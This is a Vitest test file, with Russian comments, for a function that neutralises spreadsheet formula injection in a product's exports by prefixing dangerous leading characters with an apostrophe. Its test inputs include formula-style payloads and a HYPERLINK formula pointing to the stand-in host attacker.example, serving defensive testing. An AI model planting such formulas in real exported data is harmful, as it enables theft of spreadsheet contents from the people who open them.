import { describe, expect, it } from 'vitest';
import { spreadsheetText } from '$lib/server/spreadsheet';

/**
 * Правило одно на все выгрузки продукта: книгу показателей, CSV журнала и
 * таблицу выгрузки из системы обучения. Проверяется оно здесь, а в каждой из
 * выгрузок — то, что она через это правило действительно проходит.
 */
describe('текст для таблицы', () => {
	it('помечает как текст всё, что таблица прочитала бы формулой', () => {
		for (const start of ['=', '+', '-', '@', '\t', '\r']) {
			expect(spreadsheetText(`${start}CMD()`)).toBe(`'${start}CMD()`);
		}
	});

	it('обезвреживает ссылку, которой из таблицы уносят её же содержимое', () => {
		expect(spreadsheetText('=HYPERLINK("http://attacker.example","Отчёт")')).toBe(
			'\'=HYPERLINK("http://attacker.example","Отчёт")'
		);
	});

	it('не трогает обычный текст', () => {
		expect(spreadsheetText('Академия связи')).toBe('Академия связи');
		expect(spreadsheetText('Программа 2+2')).toBe('Программа 2+2');
		expect(spreadsheetText('')).toBe('');
	});
});
